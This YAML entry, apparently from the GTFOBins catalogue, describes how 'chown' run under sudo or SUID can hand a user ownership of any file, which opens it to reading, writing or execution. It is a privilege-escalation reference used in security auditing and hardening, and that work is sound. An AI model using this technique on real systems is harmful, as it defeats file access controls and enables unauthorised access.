<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/chown -->
---
functions:
  privilege-escalation:
  - code: |-
      chown $(id -un):$(id -gn) /path/to/input-file
    comment: |-
      This can be run with elevated privileges to change ownership and then read, write, or execute a file.
    contexts:
      sudo:
      suid:
...
